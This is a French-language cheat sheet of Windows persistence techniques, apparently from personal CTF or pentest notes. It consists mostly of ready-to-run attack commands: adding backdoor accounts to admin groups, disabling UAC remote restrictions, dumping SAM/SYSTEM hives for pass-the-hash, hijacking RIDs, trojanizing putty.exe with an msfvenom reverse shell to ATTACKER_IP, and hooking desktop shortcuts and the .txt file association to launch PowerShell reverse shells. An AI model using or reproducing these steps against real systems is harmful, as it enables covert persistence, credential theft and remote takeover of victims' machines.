# Windows
Quelques techniques de persistence sur windows

## Commandes

```
evil-winrm -i <IP> -u MyUser -p MyPassword
xfreerdp /u:MyUser /p:MyPassword /v:<IP> +clipboard
```
## Sur la machine [victime]
```
net localgroup administrators MyUser /add
net localgroup "Backup Operators" MyUser /add
net localgroup "Remote Management Users" MyUser /add
```
Si winrm, pour bypass <a href="https://learn.microsoft.com/fr-fr/windows/security/application-security/application-control/user-account-control/how-it-works">UAC</a>
```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Avec un utilisateur qui a les privilèges [WinRM] <a href="https://github.com/fortra/impacket">Repo GitHub ici!</a>
```
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak
```
[Attaquant]
```
python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
evil-winrm -i 10.10.66.252 -u Administrator -H <theHash>
```
<br>
<br>

## Special Privileges and Security Descriptors

```
secedit /export /cfg config.inf
```
![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/58320646-9e80-4e67-8fa1-7d529653acc9)

```
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
```
On doit maintenant avoir les privilèges `Backup Operator`.

si utilisation de winrm, sur le GUI taper [PowerShell]
```
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```
Y ajouter l'utilisateur

## RID Hijacking
Check des utilisateurs avec leur RID
```
wmic useraccount get name,sid
```
```
PsExec64.exe -i -s regedit
```

Sous `HKLM\SAM\SAM\Domains\Account\Users\`, chercher la valeur hexadécimal qui correspond au RID de l'utilisateur souhaité. Tool en ligne pour convertir les RID en hexadécimal <a href="https://www.to-convert.com/fr/nombre/convertir-decimal-en-hexadecimal.php">ici</a>.
<br>
UNe fois qu'on a trouvé la valeur qui correspond à notre utilisateur, on ouvre le dossier pour éditer la valeur de `F` à la ligne 0030 (correspond au RID en little-endian c'est-à-dire <strong>inversé</strong>)

![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/82e4b1fa-a8ed-43fe-ae39-84cc08a64fff)
<br>
On va cherché à lui donner la valeur de celui de l'administrateur à savoir RID=500 donc `01F4` (`F401` en little-endian)! 

![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/bdeef6ac-10eb-479e-9173-98dbc9efaa4f)

La prochaine fois que le user se connectera LSASS associera à celui-ci, le même RID que l'administrateur !

<br>
<br>

## Executable Files

Avec `evil-winrm` télécharger en local le fichier exécutable (exemple avec PuTTY)
```
download "C:\Program Files\PuTTY\putty.exe"
```
ensuite 
```
msfvenom -a x64 -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```
On réupload derrière
```
upload puttyX.exe
```

## Shortcut Files

Script PowerShell pour reverse shell <a href="https://github.com/martinsohn/PowerShell-reverse-shell/tree/main">ici</a>.
<br>
<br>
Créer un fichier `backdoor.ps1` par exemple ici : `C:\Windows\System32\backdoor.ps1`.
<br>
Faire propriété sur un raccourci du bureau et y coller dans `Target` :
```
Start-Process -NoNewWindow "C:\Windows\System32\backdoor.ps1 ATTACKER_IP 4445"

C:\Windows\System32\<file>.exe
```
Penser aussi à changer l'icône !
<br>
<br>
## Hijacking File Associations (exemple avec .txt)
Ouvrir `regedit.exe`
<br>
Se rendre ici 
```
HKLM\Software\Classes\.txt
```
![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/d7767880-f541-4ca9-aeaa-9f197a1125b0)

Ensuite 
```
HKLM\Software\Classes\txtfile\shell\open\command
```
![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/80ca377c-f582-4aa9-a851-cdd0b7e4b4ab)

On créer une backdoor.ps1 quelque part dans l'arborescence, puis on modifie la valeur `Data`
```
Start-Process -NoNewWindow "c:\Windows\System32\backdoor.ps1 ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```
